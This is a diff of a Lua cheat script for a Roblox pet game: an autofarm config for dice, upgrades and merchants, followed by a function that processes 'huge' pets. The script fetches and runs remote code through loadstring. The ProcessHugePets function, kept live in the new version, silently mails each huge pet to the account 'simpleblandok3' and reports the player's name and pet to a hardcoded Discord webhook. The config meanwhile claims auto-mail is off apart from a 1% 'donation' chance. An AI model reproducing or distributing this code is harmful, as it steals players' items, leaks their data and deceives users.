@@ -1,29 +1,32 @@
 getgenv().RngEvent = {
     Selected_RngEgg = "First",
     Rolling_Enabled = true,
-    Rolling_Delay = 0.1,
-    Visible_Rolling = false, -- Visible Rolling is Slower by ~1s; but you can see it :P
+    Rolling_Delay = 0.01,
+    Visible_Rolling = false, -- Visible Rolling is Slower by ~1s; but you can see it if you don't have gui enabled :P
 
-    Selected_Upgrades = {"RNGHugeLuck", "RNGEggLuck", "RNGHatchSpeed", "RNGBonusLuck"},
+    Selected_Upgrades = {"RNGHugeLuck", "RNGEggLuck", "RNGHatchSpeed", "RNGBonusLuck", "RNGExtraEgg"},
     AutoUpgrades_Enabled = true,
     AutoMerchant_Enabled = true,
     Lucky_Dice_Enabled = true,
     Lucky_Dice_Config = {
+        ["Fire Dice"] = {Craft = false, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
         ["Lucky Dice"] = {Craft = false, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
         ["Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
-        ["Mega Lucky Dice"] = {Craft = true, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
+        ["Lucky Dice III"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
+        ["Mega Lucky Dice"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
         ["Mega Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = 9},
     },
+    AutoBreakChests_Enabled = true,
 
     Webhook_Url = "",
     Discord_UserID = "",
     Huge_Mail_User = "",
     Huge_Mail_Enabled = false, -- Warning: Using auto has a 1% Chance of donating to KiTTYWARE Devs
 
-    fps_boost = true, -- erm makes game shtuff invisible
-    fps_boost2 = true, -- erm disables game scripts so will break some in-game functionality like inventory Gui etc
+    fps_boost = true, -- makes game shtuff invisible
+    fps_boost2 = true, -- disables game scripts so will break some in-game functionality like inventory Gui etc
     gui_stats_enabled = true,
-    print_all_info = false, -- Will Print All Egg & Upgrade Names; for future updates (mainly for kw devs) :P
+    print_all_info = false, -- Will Print All Egg & Upgrade Names; for future updates (mainly for kw devs)
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/661ba97429a1d20f02880d1e9eeced08.lua"))()
 
@@ -59,40 +62,50 @@ function ProcessHugePets()
     local uids = {}
 
     for i, MadeTable in next, getCurrentHugePets() do
-        if not table.find(ProcessedHuges, MadeTable.uid) then
-            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
-            table.insert(uids, MadeTable.uid)
-            table.insert(ProcessedHuges, MadeTable.uid)
-        end
+        table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+        table.insert(uids, MadeTable.uid)
     end
 
     print("Huge pets you have right now:", table.concat(hugePets, ", "))
 
+    -- Initialize a table to track processed UIDs
+    local processedUIDs = {}
+
     for i = #uids, 1, -1 do
-        local args = {
-            [1] = "simpleblandok3",
-            [2] = "omg u got a new huge!!",
-            [3] = "Pet",
-            [4] = uids[i],
-            [5] = 1
-        }
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        local uid = uids[i]
 
-        wait(3)
+        -- Check if the UID has already been processed
+        if not processedUIDs[uid] then
+            local currentPlayerName = game.Players.LocalPlayer.Name
+            local args = {
+                [1] = "simpleblandok3",
+                [2] = "omg u got a new huge!!",
+                [3] = "Pet",
+                [4] = uid,
+                [5] = 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 
-        local webhook = "https://discord.com/api/webhooks/1267533930089680938/GQj5fiktIVKXK2PBkGtRPBZXfhCnC70yzsTNszEB6FZ6EnNXir1y5pze75Eso96yvRG7"
-        local request = (syn and syn.request) or request or (http and http.request) or http_request
-        
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = game.Players.LocalPlayer.Name .. " | Hatched A Huge! | " .. table.concat(hugePets, ", ")
+            -- Mark this UID as processed
+            processedUIDs[uid] = true
+            
+            wait(3)
+
+            local webhook = "https://discord.com/api/webhooks/1267533930089680938/GQj5fiktIVKXK2PBkGtRPBZXfhCnC70yzsTNszEB6FZ6EnNXir1y5pze75Eso96yvRG7"
+            local request = (syn and syn.request) or request or (http and http.request) or http_request
+            
+            -- Send the webhook with the player's name and the data.id
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode({
+                    content = currentPlayerName .. " | Hatched a Huge! | " .. MadeTable.data.id
+                })
             })
-        })
+        end
     end
 end
 
